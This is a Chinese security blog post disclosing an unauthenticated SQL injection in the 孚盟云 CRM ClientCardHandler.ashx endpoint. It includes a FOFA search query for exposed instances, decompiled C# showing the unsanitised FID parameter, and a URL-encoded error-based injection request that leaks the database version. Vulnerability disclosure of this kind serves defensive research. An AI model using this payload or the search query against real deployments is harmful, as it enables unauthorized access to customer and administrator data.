---
title: "孚盟云CRM ClientCardHandler.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-ClientCardHandler-sqli.html
asset_dir: assets/孚盟云crm-clientcardhandler.ashx-sql注入漏洞
---

# 孚盟云CRM ClientCardHandler.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/2 11:52
* 843浏览
* [0评论](#comment)
* 14分钟阅读

深入探索

服务器

CRM

SaaS


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云ClientCardHandler.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 ClientCardHandler.ashx 对应的dll文件 FumaCRM\_BS.NewWeb.dll 里有关 ClientCardHandler 方法的实现如下

深入探索

数据库

软件即服务

软件

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str = context.Request["method"].ToString();
  if (!string.op_Equality(str, "SaveContacts"))
  {
    if (!string.op_Equality(str, "LoadCustomersInfo"))
    {
      if (!string.op_Equality(str, "getCardImage"))
        return;
      this.getCardImage(context);
    }
    else
      this.LoadCustomersInfo(context);
  }
  else
    this.SaveContacts(context);
}
```

深入探索

身份验证

鉴权

SQL

当 **method=getCardImage** 时，进入`getCardImage`方法

```
public void getCardImage(HttpContext context)
{
  this.WriteLog("进入名片FID信息获取imageurl");
  string str = context.Request["FID"].ToString();
  Hashtable o = new Hashtable();
  try
  {
    DataTable dataSource = new CreatePageDao().GetDataSource($" select Front_jpg,Back_jpg,CustFID,ConStactFID from bfCamCardInfo where FID='{str}' ");
```

未经过滤或参数化绑定的参数 **FID** 被直接拼接进SQL语句中进行执行，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

其他当 `method=LoadCustomersInfo`、`SaveContacts时`，均存在SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

[![孚盟云CRM ClientCardHandler.ashx SQL注入漏洞](images/img-001-84142cb878d1.webp)](https://image.mrxn.net/99f1cb0b894442d8995b5e1bffd64587.webp)

[![孚盟云CRM ClientCardHandler.ashx SQL注入漏洞](images/img-002-f3b227fb6e95.webp)](https://image.mrxn.net/8ab18d65ba204c45b8d828d6fe387da5.webp)

# 漏洞复现

```
GET /m/Dingding/Ajax/ClientCardHandler.ashx?method=getCardImage&FID=%31%27%61%6e%64%20%31%3c%40%40%76%65%72%73%69%6f%6e%2d%2d HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM ClientCardHandler.ashx SQL注入漏洞](images/img-003-fccd1c561973.webp)](https://image.mrxn.net/cdbfba031d064ad2bb1162757161a998.webp)

成功通过报错注入在响应回显数据库版本信息

SQL注入检测工具

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM ClientCardHandler.ashx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-ClientCardHandler-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-ClientCardHandler-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-ClientCardHandler-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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